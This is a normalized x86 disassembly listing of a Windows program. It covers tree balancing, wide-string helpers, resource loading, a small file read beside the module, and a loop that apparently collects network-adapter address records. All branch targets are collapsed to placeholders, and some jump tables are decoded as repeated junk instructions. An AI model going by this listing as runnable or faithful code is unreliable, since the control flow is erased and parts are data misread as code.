mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x15 ] bl
jne r-xdata
mov ecx edx
mov edx [ ecx ]
mov esi [ edx + 0x8 ]
mov [ ecx ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x15 ] bl
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x14 ] bl
je r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x15 ] bl
jne r-xdata
mov ecx edx
mov edx [ ecx + 0x8 ]
mov esi [ edx ]
mov [ ecx + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x15 ] bl
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ eax + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ eax + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] ecx
mov [ ecx + 0x4 ] edx
sub_4021c0
push ebp
mov ebp esp
push 0xffffffff
push sub_44738b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov edi edx
push 0x18
call [ operator new@IAT ]
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
test esi esi
je r-xdata
mov [ ebp - 0x14 ] 0x0
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x28 ]
call [ std::exception::exception@IAT ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x28 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
push r--data
lea edx [ ebp - 0x28 ]
push edx
call _CxxThrowException
mov eax [ edi + 0x4 ]
mov [ esi ] eax
mov ecx [ edi + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ edi + 0x4 ]
mov [ esi + 0x8 ] edx
mov [ esi + 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea edi [ esi + 0xc ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x4 ] 0x2
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x10
call sub_4025f0
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x4 ] 0x4
add edi 0x4
mov [ ebp - 0x1c ] edi
mov eax [ ebx + 0x4 ]
sub eax 0x10
call sub_4025f0
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x4 ] 0x2
sub_4022e0
push ebp
mov ebp esp
push 0xffffffff
push sub_44548d
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov ecx 0x1
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_402370
push ebp
mov ebp esp
push 0xffffffff
push sub_444d59
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call [ std::exception::~exception@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_4023c0
push ebp
mov ebp esp
push 0xffffffff
push sub_445439
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0x8 ]
push eax
call [ std::exception::exception@IAT ]
mov [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_402420
push ebp
mov ebp esp
push 0xffffffff
push sub_445439
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call [ std::exception::~exception@IAT ]
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_402480
push ebp
mov ebp esp
push eax
mov eax [ ebp + 0x8 ]
push ecx
push edx
push eax
call [ memcpy_s@IAT ]
add esp 0x10
cmp eax 0x50
ja r-xdata
push 0x80004005
call sub_402d00
movzx ecx [ eax + lookup_table_4024d8 ]
jmp [ ecx * 4 + jump_table_4024c8 ]
push 0x8007000e
call sub_402d00
push 0x80070057
call sub_402d00
pop ebp
retn
sub_4024dc
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ah cl
int3
sub_402530
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push edx
push eax
call [ memmove_s@IAT ]
add esp 0x10
cmp eax 0x50
ja r-xdata
push 0x80004005
call sub_402d00
movzx ecx [ eax + lookup_table_402590 ]
jmp [ ecx * 4 + jump_table_402580 ]
push 0x8007000e
call sub_402d00
push 0x80070057
call sub_402d00
pop ebp
retn
sub_402594
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ah cl
int3
sub_4025f0
push esi
mov esi eax
mov ecx [ esi ]
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
push edi
call edx
cmp [ esi + 0xc ] 0x0
lea ecx [ esi + 0xc ]
jl r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ eax ]
mov edx [ edx ]
push 0x2
push ecx
mov ecx eax
call edx
mov edi eax
test edi edi
jne r-xdata
cmp eax [ esi ]
jne r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
mov eax [ esi + 0x4 ]
lea eax [ eax + eax + 0x2 ]
push eax
add esi 0x10
push esi
push eax
lea ecx [ edi + 0x10 ]
push ecx
call [ memcpy_s@IAT ]
add esp 0x10
mov eax edi
pop edi
pop esi
retn
call sub_402c00
mov edi esi
mov eax 0x1
[ ecx ] eax
mov eax edi
pop edi
pop esi
retn
sub_402660
push ebp
mov ebp esp
push ecx
push ebx
push esi
xor ebx ebx
push ebx
mov ecx rw-data
call sub_443c15
mov esi eax
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov eax edi
shr eax 0x4
inc eax
push ebx
movzx ecx ax
push ecx
push 0x6
push esi
call [ FindResourceExW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
call sub_443c15
inc [ ebp - 0x4 ]
mov esi eax
test esi esi
jne r-xdata
push esi
mov eax edi
call sub_4026e0
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4026e0
push ebp
mov ebp esp
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
call [ LoadResource@IAT ]
test eax eax
jne r-xdata
push esi
push eax
call [ LockResource@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop ebp
retn
pop esi
xor eax eax
pop edi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ebx
push ecx
call [ SizeofResource@IAT ]
add eax esi
and edi 0xf
jbe r-xdata
cmp esi eax
jb r-xdata
cmp esi eax
jae r-xdata
movzx eax [ esi ]
neg eax
sbb eax eax
and eax esi
pop esi
pop edi
pop ebp
retn
dec edi
movzx edx [ esi ]
lea esi [ esi + edx * 2 + 0x2 ]
jne r-xdata
sub_402740
push ebp
mov ebp esp
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push esi
push eax
push ecx
call [ wmemcpy_s@IAT ]
add esp 0x10
cmp eax 0x50
ja r-xdata
mov eax esi
lea edx [ eax + 0x2 ]
lea ecx [ ecx ]
push 0x80004005
call sub_402d00
movzx edx [ eax + lookup_table_4027b8 ]
jmp [ edx * 4 + jump_table_4027a8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
inc eax
push 0x8007000e
call sub_402d00
push 0x80070057
call sub_402d00
pop ebp
retn
sub_4027bc
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ah cl
int3
sub_402810
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
push esi
mov esi eax
shr eax 0x4
inc eax
movzx ecx ax
push 0x6
push ecx
push edx
call [ FindResourceW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4026e0
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
movzx ebx [ esi ]
test ebx ebx
jns r-xdata
mov eax [ edi ]
mov edx [ eax - 0x8 ]
mov ecx 0x1
sub ecx [ eax - 0x4 ]
sub edx ebx
or ecx edx
jge r-xdata
push 0x80070057
call sub_402d00
movzx eax [ esi ]
mov ecx [ edi ]
push ebx
add esi 0x2
push ecx
call sub_402740
mov eax [ edi ]
add esp 0x8
cmp ebx [ eax - 0x8 ]
jg r-xdata
mov eax ebx
mov ecx edi
call sub_402c40
mov [ eax - 0xc ] ebx
mov edx [ edi ]
xor eax eax
mov [ edx + ebx * 2 ] ax
pop esi
mov eax 0x1
pop ebx
pop ebp
retn 0x4
sub_4028b0
mov ecx [ esi ]
cmp [ ecx - 0xc ] 0x0
lea eax [ ecx - 0x10 ]
push edi
mov edi [ eax ]
je r-xdata
pop edi
retn
cmp [ eax + 0xc ] 0x0
lea edx [ eax + 0xc ]
jge r-xdata
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
cmp [ ecx - 0x8 ] 0x0
jge r-xdata
mov edx [ edi ]
mov eax [ edx + 0xc ]
mov ecx edi
call eax
add eax 0x10
mov [ esi ] eax
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ecx - 0xc ] 0x0
mov eax [ esi ]
xor ecx ecx
mov [ eax ] cx
pop edi
retn
push 0x80070057
call sub_402d00
sub_402910
push ebp
mov ebp esp
push ecx
push esi
test ebx ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov esi [ ebp + 0x8 ]
call sub_4028b0
pop esi
mov esp ebp
pop ebp
retn 0x8
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax - 0xc ]
sub edi eax
sar edi 0x1
mov [ ebp - 0x4 ] ecx
test ebx ebx
jns r-xdata
push 0x80070057
call sub_402d00
mov edx 0x1
sub edx [ eax - 0x4 ]
mov eax [ eax - 0x8 ]
sub eax ebx
or edx eax
jge r-xdata
push 0x80070057
call sub_402d00
mov eax [ esi ]
mov edx [ eax - 0x8 ]
lea esi [ ebx + ebx ]
add edx edx
push esi
cmp edi [ ebp - 0x4 ]
ja r-xdata
mov eax ebx
mov ecx esi
call sub_402c40
mov ecx [ ebp + 0xc ]
push ecx
push edx
push eax
call [ memcpy_s@IAT ]
lea ecx [ eax + edi * 2 ]
push ecx
push edx
push eax
call [ memmove_s@IAT ]
jmp r-xdata
mov [ eax - 0xc ] ebx
mov eax [ ecx ]
xor ecx ecx
mov [ esi + eax ] cx
pop esi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
add esp 0x10
pop edi
cmp ebx [ eax - 0x8 ]
jg r-xdata
sub_4029c0
test edx edx
jne r-xdata
mov eax edx
push esi
lea esi [ eax + 0x2 ]
lea ebx [ ebx ]
push ebx
xor eax eax
push edx
push edi
mov ebx eax
call sub_402910
mov eax edi
pop ebx
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
pop esi
push ebx
sar eax 0x1
push edx
push edi
mov ebx eax
call sub_402910
mov eax edi
pop ebx
retn
sub_402a00
push ebp
mov ebp esp
push 0xffffffff
push sub_44aac8
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ ebp + 0x8 ]
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x0
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
test edi 0xffff0000
jne r-xdata
push edi
push esi
mov ebx eax
call sub_402910
mov eax edi
lea edx [ eax + 0x2 ]
movzx edi di
call sub_402660
test eax eax
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
mov eax edi
mov edi esi
call sub_402810
jmp r-xdata
sub_402ab0
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ebx ]
mov edx [ ebp + 0xc ]
push esi
mov esi ecx
sub esi eax
push edi
mov edi [ eax - 0xc ]
sar esi 0x1
mov [ ebp - 0x4 ] edi
test edx edx
jns r-xdata
test ecx ecx
jne r-xdata
push 0x80070057
call sub_402d00
push edx
push ecx
call [ wcsnlen@IAT ]
add esp 0x8
xor eax eax
jmp r-xdata
add edi eax
jns r-xdata
push 0x80070057
call sub_402d00
mov ecx 0x7fffffff
sub ecx eax
mov [ ebp + 0xc ] eax
cmp ecx edi
jge r-xdata
mov eax [ ebx ]
mov edx 0x1
sub edx [ eax - 0x4 ]
mov eax [ eax - 0x8 ]
sub eax edi
or edx eax
jge r-xdata
push 0x80070057
call sub_402d00
mov edx [ ebp - 0x4 ]
mov ecx [ ebx ]
cmp esi edx
lea esi [ ecx + esi * 2 ]
jbe r-xdata
mov eax edi
mov ecx ebx
call sub_402c40
mov eax [ ebp + 0xc ]
add eax eax
push eax
push esi
push eax
lea ecx [ ecx + edx * 2 ]
push ecx
call [ memcpy_s@IAT ]
mov eax [ ebx ]
add esp 0x10
cmp edi [ eax - 0x8 ]
jg r-xdata
mov esi [ ebp + 0x8 ]
mov [ eax - 0xc ] edi
mov edx [ ebx ]
xor eax eax
mov [ edx + edi * 2 ] ax
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_402b70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ eax ]
mov ecx [ esi - 0x10 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
mov ebx [ esi - 0xc ]
sub esi 0x10
push edi
call eax
mov ecx [ ebp + 0xc ]
mov edx [ eax ]
mov edx [ edx ]
push 0x2
push ecx
mov ecx eax
call edx
mov edi eax
test edi edi
jne r-xdata
mov eax [ ebp + 0xc ]
cmp ebx eax
jge r-xdata
call sub_402c00
lea eax [ eax + eax + 0x2 ]
push eax
lea edx [ esi + 0x10 ]
push edx
lea ecx [ edi + 0x10 ]
push eax
push ecx
mov [ ebp + 0xc ] ecx
call [ memcpy_s@IAT ]
add esp 0x10
mov [ edi + 0x4 ] ebx
lea eax [ esi + 0xc ]
or ecx 0xffffffff
[ eax ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov eax ebx
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
pop edi
pop esi
mov [ edx ] ecx
pop ebx
pop ebp
retn 0x8
mov ecx [ esi ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push esi
call eax
sub_402c10
mov eax [ esi ]
mov ecx [ eax - 0x10 ]
sub eax 0x10
cmp [ eax + 0x8 ] edx
jge r-xdata
call sub_402c00
test edx edx
jle r-xdata
push edi
mov edi [ ecx ]
push 0x2
push edx
push eax
mov eax [ edi + 0x8 ]
call eax
pop edi
test eax eax
jne r-xdata
add eax 0x10
mov [ esi ] eax
retn
sub_402c40
push esi
mov esi ecx
push edi
mov edi eax
mov eax [ esi ]
mov ecx [ eax - 0xc ]
cmp ecx edi
jle r-xdata
cmp [ eax - 0x4 ] 0x1
jle r-xdata
mov edi ecx
mov eax [ eax - 0x8 ]
cmp eax edi
jge r-xdata
push edi
push esi
call sub_402b70
pop edi
pop esi
retn
pop edi
pop esi
retn
mov ecx eax
cmp ecx 0x40000000
jle r-xdata
cdq
sub eax edx
sar eax 0x1
add ecx eax
add ecx 0x100000
jmp r-xdata
mov edx ecx
call sub_402c10
mov ecx edi
cmp ecx edi
jge r-xdata
sub_402ca0
push ebp
mov ebp esp
push 0xffffffff
push sub_445408
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ecx ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_402d20
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_402d40
push ebp
mov ebp esp
push 0xffffffff
push sub_447328
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ esi ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_402da0
push ebp
mov ebp esp
push 0xffffffff
push sub_449938
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ rw-data ]
movzx edx cx
push edx
mov edx ecx
mov ecx [ rw-data ]
mov esi ecx
shrd edx esi 0x10
and edx 0xffff
push edx
mov edx ecx
and ecx 0xffff
push ecx
movsx ecx [ rw-data ]
push ecx
push r--data
push 0xffffffff
push 0x40
push eax
sar esi 0x10
sar edx 0x1f
call [ _snwprintf_s@IAT ]
add esp 0x20
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
lea esi [ eax + 0x10 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
mov eax [ esi - 0x8 ]
mov ecx 0x1
sub ecx [ esi - 0x4 ]
sub eax 0x104
or eax ecx
jge r-xdata
push 0x104
push esi
push 0x0
call [ GetModuleFileNameW@IAT ]
mov eax [ esi - 0x8 ]
mov ecx 0x1
sub ecx [ esi - 0x4 ]
sub eax 0x104
or eax ecx
jge r-xdata
mov eax 0x104
lea ecx [ ebp - 0x10 ]
call sub_402c40
mov esi [ ebp - 0x10 ]
push r--data
push esi
call [ PathAppendW@IAT ]
mov eax [ esi - 0x8 ]
push eax
push esi
call [ wcsnlen@IAT ]
add esp 0x8
test eax eax
js r-xdata
mov eax 0x104
lea ecx [ ebp - 0x10 ]
call sub_402c40
mov esi [ ebp - 0x10 ]
push 0x80070057
call sub_402d00
cmp eax [ esi - 0x8 ]
jg r-xdata
xor ecx ecx
push ecx
push 0x80
push 0x3
push ecx
push 0x3
push 0x80000000
mov [ esi - 0xc ] eax
push esi
mov [ esi + eax * 2 ] cx
call [ CreateFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ esi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
push 0x0
push edi
call [ GetFileSize@IAT ]
cmp eax 0x8
jbe r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
push edi
call [ CloseHandle@IAT ]
push 0x0
lea edx [ ebp - 0x14 ]
push edx
push 0x8
push rw-data
push edi
mov [ ebp - 0x14 ] 0x0
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
cmp [ ebp - 0x14 ] 0x8
je r-xdata
sub_402f90
push ebp
mov ebp esp
sub esp 0xc
push esi
push r--data
call [ LoadLibraryW@IAT ]
mov esi eax
mov [ ebp - 0xc ] esi
test esi esi
jne r-xdata
push edi
push r--data
push esi
call [ GetProcAddress@IAT ]
mov edi eax
test edi edi
jne r-xdata
xor al al
pop esi
mov esp ebp
pop ebp
retn
mov esi [ malloc@IAT ]
push ebx
push 0xf30
mov [ ebp - 0x8 ] 0xf30
call esi
mov ebx eax
add esp 0x4
lea eax [ ebp - 0x8 ]
push eax
push ebx
call edi
cmp eax 0x6f
jne r-xdata
push esi
call [ FreeLibrary@IAT ]
pop edi
xor al al
pop esi
mov esp ebp
pop ebp
retn
mov [ ebp - 0x1 ] 0x0
test eax eax
jne r-xdata
push ebx
call [ free@IAT ]
mov ecx [ ebp - 0x8 ]
push ecx
call esi
add esp 0x8
lea edx [ ebp - 0x8 ]
mov ebx eax
push edx
push ebx
call edi
push ebx
call [ free@IAT ]
mov eax [ ebp - 0xc ]
add esp 0x4
push eax
call [ FreeLibrary@IAT ]
mov al [ ebp - 0x1 ]
pop ebx
pop edi
pop esi
mov esp ebp
pop ebp
retn
xor ecx ecx
mov eax ebx
test ebx ebx
je r-xdata
mov [ ebp - 0x1 ] 0x1
mov esi [ ebp + 0x8 ]
lea edx [ esi + 0x18 ]
lea esp [ esp ]
mov edi [ eax + 0x1a0 ]
cmp edi 0x6
jne r-xdata
cmp edi 0x47
jne r-xdata
mov edi [ eax + 0x194 ]
mov [ esi ] edi
mov edi [ eax + 0x198 ]
mov [ esi + 0x4 ] edi
add esi 0x8
jmp r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
